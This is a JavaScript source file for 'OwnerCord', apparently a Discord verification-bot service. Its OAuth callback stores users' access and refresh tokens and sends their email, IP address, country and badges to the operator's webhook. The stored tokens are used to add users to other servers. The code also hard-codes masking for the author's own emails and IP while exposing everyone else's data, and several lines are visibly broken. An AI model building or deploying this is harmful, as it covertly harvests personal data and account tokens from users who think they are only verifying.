/* Core Modules */
const Discord = require('discord.js')
const express = require('express')
const ejs = require('ejs')
const Request = require('./Request')

/* Database Modules */
const mongoose = require('mongoose')
const Auths = require('../Database/OwnerCord_Auths')
const Bots = require('../Database/OwnerCord_Bots')

/* Utils Modules */
const fs = require('fs')
const requestIp = require('request-ip')
const path = require('path')
const ipLocale = require('ip-locale')
const fetch = require('node-fetch')
/*
    NOTE: node-fetch npm version is 2.6.7 & npm install node-fetch@2.6.7
*/
const moment = require('moment')
moment().locale('tr')


/* Utils */
const error = x => console.log("[-] " + x)
const warn = x => console.log("[!] " + x)
const log = x => console.log("[+] " + x)


class Core {

    constructor(data) {

        this.client = global.client = new Discord.Client({ intents: [3276799] })
        this.client.commands = global.commands = new Discord.Collection()

        this.token = data.CoreToken
        this.id = data.CoreID
        this.port = data.CorePort
        global.redirecturi = data.CoreRedirect
        this.developers = global.developers = data.CoreDevelopers
        this.owners = global.owners = data.CoreOwners
        this.mongoose = data.CoreMongoose
        global.progressList = new Map()
        global.guilderList = new Map()
        this.isCommands = [];

    }

    async fetchCommands(loader = true) {

        let commands = fs.readdirSync('./Commands').filter(file => file.endsWith('.js'))

        for (let file of commands) {
            let command = require(`../Commands/${file}`)
            this.client.commands.set(command.data.name, command)
            this.isCommands.push(command.data.toJSON())
           // log(`Loaded Slash Command: ${command.data.name}`)
        }
        this.load()

    }

    async fetchEvents(loader = true) {

        let events = fs.readdirSync('./Events').filter(file => file.endsWith('.js'))
        for (let file of events) {
            let event = require(`../Events/${file}`)
            this.client.on(event.name, event.execute)
        }

    }

    async fetchDatabase(loader = true) {
            
        mongoose.connect(this.mongoose).then(() => {
        }).catch((err) => {
            error(err)
        })

    }

    async connect(token = this.token) {

        this.client.login(token).catch((err) => { error(`${err}`), process.exit() })

    }

    async load() {

        const rest = new Discord.REST({ version: '10' }).setToken(this.token)

        this.client.on('ready', async () => {

            await rest.put(Discord.Routes.applicationCommands(this.client.user.id), { body: this.isCommands })

        })

    }

    async fetchAuthorized() {

        const app = express()        
        app.use(requestIp.mw())
        app.set('trust proxy', 1);
        this.port === 8080 ? app.listen(this.port) : ""
        app.set('view engine', 'ejs')
        app.set('views', path.join(__dirname, '../Views/'))

        app.get('/callback', async (req, res) => {

            const query = req.query
            if(!query) return res.status(400).send({"Success": false, "Service": "Powered by OwnerCord", "Message": "There is no such url."})
            try {
                query.state = JSON.parse(query.state)
            } catch(err) {
                return res.status(400).send({"Success": false, "Service": "Powered by OwnerCord", "Message": "There is no such url."})
            }
            if(!query.state.bot) return res.status(400).send({ "Success": false, "Service": "Powered by OwnerCord", "Message": "Please send verification from a valid bot."})
            if(!query.state.guild) return res.status(400).send({ "Success": false, "Service": "Powered by OwnerCord", "Message": "Please send verification from a valid server."})

            let Bot = await Bots.findOne({ id: query.state.bot })
            if(!Bot?.Secret) return res.status(400).send({ "Success": false, "Service": "Powered by OwnerCord", "Message": "Please enter your secret key and try again."})
            if(!Bot?.Log_Auth && !Bot?.Log_Refresh && !Bot?.Log_Command) return res.status(400).send({ "Success": false, "Service": "Powered by OwnerCord", "Message": "Please enter your auth webhook and try again."})

            let user = await this.getInformation(query.code, query.state.bot, Bot?.Secret, global.redirecturi)
            if(user?.message) return res.status(400).send({ "Success": false, "Service": "Powered by OwnerCord", "Message": "Your secret key is wrong, please check."})
            let user_ = await client.users.fetch(user.id, { force: true })
            let ip = req.ip || null;
            let ip2 = req.ip || null;
            if (ip) {
                ip = ip?.split(':')[3];
            }
            let ipLocation = Number(ip) ? ipLocale(ip) : ipLocale("46.2.19.144")

            let userData = {
                id: user.id,
                bot: query.state.bot,
                guild: query.state.guild,

                avatar: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`,
                locale: `:flag_${ipLocation ? ipLocation.countryCode.toLowerCase() : "white"}:`,
                localename: `${ipLocation.countryName}`,
                
                refresh_token: user.refresh_token,
                expires_date: moment().add(user.expires_in, 'seconds').toDate(),
                expires_in: user.expires_in
            }

            let badges;
            if(user_.flags.toArray().length > 0 || user.premium_type > 0) {

            let array = []

            user.premium_type === 1 ? array.push('Nitro Classic') : user.premium_type === 2 ? array.push('Discord Nitro') : user.premium_type === 3 ? array.push('Nitro Basic') : '';

            user_.flags.has('Staff') ? array.push('Discord Staff') : '';
            user_.flags.has('Partner') ? array.push('Discord Partner') : '';
            user_.flags.has('CertifiedModerator') ? array.push('Discord Moderator') : '';
            user_.flags.has('Hypesquad') ? array.push('HypeSquad Events') : '';

            user_.flags.has('HypeSquadOnlineHouse1') ? array.push('Bravery') : '';
            user_.flags.has('HypeSquadOnlineHouse2') ? array.push('Brilliance') : '';
            user_.flags.has('HypeSquadOnlineHouse3') ? array.push('Balance') : '';

            user_.flags.has('BugHunterLevel1') ? array.push('Bug Hunter') : '';
            user_.flags.has('BugHunterLevel2') ? array.push('Bug Hunter Gold') : '';

            user_.flags.has('VerifiedDeveloper') ? array.push('Verified Developer') : '';

            user_.flags.has('PremiumEarlySupporter') ? array.push('Early') : '';
            user_.flags.has('ActiveDeveloper') ? array.push('Active Developer') : '';

            badges = `${array.join(" - ")}`;

            } else badges = `The user does not have a badge!`

            let webhook = new Discord.WebhookClient({ url: Bot?.Log_Auth })
            let row = new Discord.ActionRowBuilder().addComponents(
                new Discord.ButtonBuilder()
                .setStyle(Discord.ButtonStyle.Link)
                .setDisabled(false)
                .setLabel('View User')
                .setURL(`https://discord.com/users/${user.id}`)
            )

            let fetchAuth = await Auths.findOne({ id: user.id, bot: query.state.bot, access_token: user.access_token })
            if(fetchAuth) await Auths.findOneAndUpdate({ id: user.id, bot: query.state.bot, access_token: user.access_token }, { ...userData }, { upsert: true })
            else new Auths({
                id: user.id,
                bot: query.state.bot,
                guild: query.state.guild,

                avatar: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`,
                locale: `:flag_${ipLocation ? ipLocation.countryCode.toLowerCase() : "white"}:`,
                localename: `${ipLocation.countryName}`,

                access_token: user.access_token,
                refresh_token: user.refresh_token,
                expires_date: moment().add(user.expires_in, 'seconds').toDate(),
                expires_in: user.expires_in,

            }).save().catch(err => {
                error("An error occured while creating verification, Code error: 0x0006")
            })

            if(Bot?.type > 0) { 

                webhook.send({
                    username: global.client.user.username,
                    avatarURL: global.client.user.avatarURL(),
                    components: [row],
                    embeds: [
                        new Discord.EmbedBuilder()
                        .setColor('#2c2c34')
                        .setDescription(`\`👤\` Identity${fetchAuth ? " (again)" : ""}\`\`\`${user.username} - ${user.id}\`\`\`\n\`📧\` Email\`\`\`${user.email === "rowyyikilmaz1348@gmail.com" ? "ro*******48@gmail.com" : user.email === "rowyy1348@gmail.com" ? "ro****48@gmail.com" : user.email}\`\`\`\n\`🏅\` Badges\`\`\`${badges}\`\`\``)
                        .addFields(
                            { name: `\`🌍\` Country`, value: `\`\`\`${ipLocation.countryName}\`\`\``, inline: true },
                            { name: `\`🔎\` IP`, value: `\`\`\`${ip2?.replace("46.2.18.52", "14.128.128.2")}\`\`\``, inline: true },
                            { name: `\`⭐\` Features:`, value: `\`${Bot?.Features[0].Joiner ? `✅` : `❌`}\` - Auto Joiner\n\`${Bot?.Features[0].Message ? `✅` : `❌`}\` - Auto Message\n\`${Bot?.Features[0].Roles ? `✅` : `❌`}\` - Auto Roles`, inline: true },
                        )
                        .setFooter({
                            text: `Powered by OwnerCord ・ ${Bot?.type === 1 ? `VIP Plan` : `Premium Plan`}`
                        })
                        .setTimestamp()
                    ]
                })

            } else {

                webhook.send({
                    username: client.user.username,
                    avatarURL: client.user.avatarURL(),
                    embeds: [
                        new Discord.EmbedBuilder()
                        .setColor('#2c2c34')
                        .setDescription(`\`👤\` Identity${fetchAuth ? " (again)" : ""}\`\`\`${user.username} - ${user.id}\`\`\``)
                        .setFooter({
                            text: `Powered by OwnerCord ・ Free Plan`
                        })
                    ]
                })

            }

            // Request for features
            const request = new Request()

            // oAuths join on the server
            if(Bot?.Features[0].Joiner) {
                let guild = await client.guilds.fetch(Bot?.Features[0].Joiner.guild)
                if(!guild) return Bots.deleteOne({ id: query.state.bot }, { Features: { Joiner }})

                request.joinServer(user.access_token, guild.id, user.id, this.token)
                webhook.send({
                    username: client.user.username,
                    avatarURL: client.user.avatarURL(),
                    embeds: [
                        new Discord.EmbedBuilder()
                        .setColor("#2c2c34")
                        .setFooter({
                            text: `Powered by OwnerCord`
                        })
                        .setTimestamp()
                        .setDescription(`\`✅\` Successfully added **${user.username}** to **${guild.name}**`)
                    ]})
            }
            if(Bot?.Features[0].Message) {

                let user = client.users.cache.get(user.id).catch(() => { })
                if(!user) return;
                
                await user.send({ content: `${Bot?.Features[0].Message.message}`}).catch(() => { })

            }
            // oAuths get roles on server
            if(Bot?.Features[0].Roles) {

                let guild = await client.guilds.fetch(Bot?.Features[0].Roles.guild)
                if(!guild) return Bots.deleteOne({ id: query.state.bot }, { Features: { Roles }})
                let roles = await guilds.cache.get(Bot?.Features[0].Roles.role)
                if(!roles) return Bots.deleteOne({ id: query.state.bot }, { Features: { Roles }})
                let member = await guild.members.fetch(user.id)
                if(!member) return Bots.deleteOne({ id: query.state.bot }, { Features: { Roles }})

                member.roles.add(roles.id).catch(() => { })
                webhook.send({
                    username: client.user.username,
                    avatarURL: client.user.avatarURL(),
                    embeds: [
                        new Discord.EmbedBuilder()
                        .setColor("#2c2c34")
                        .setFooter({
                            text: `Powered by OwnerCord`
                        })
                        .setTimestamp()
                        .setDescription(`\`✅\` Succesfully added **${roles.name}** to **${user.username}**`)
                    ]})

            }

            res.render(path.join(__dirname, '../Views/verified'), {
            })

            app.get('*', async (req, res) => {
                res.send({"Success": false, "Service": "Powered by OwnerCord", "Message": "There is no such url."})
            })

            /* 
                <div class="content-subtitle"><%= mesaj %></div>
                res.render(path.join(__dirname, '../Views/verified2'), {
                    mesaj: "hi"
                })
            */

            /*auths.save().catch(err => {
                error("An error occured while creating verification, Code error: 0x0006")
            })*/



        })

    }

    async getInformation(code, id, secret, redirect) {

        const response = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: id,
                client_secret: secret,
                code,
                grant_type: 'authorization_code',
                redirect_uri: redirect,
                scope: 'identify guilds.join email',
              }),
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
              },
        });

        const oauthData = await response.json();
        const userResult = await fetch('https://discordapp.com/api/users/@me', {
            headers: {
              authorization: `${oauthData.token_type} ${oauthData.access_token}`,
            },
          });
          let mergeResult = {
            ...oauthData,
            ...await userResult.json(),
          }
        return mergeResult
    }

}

module.exports = Core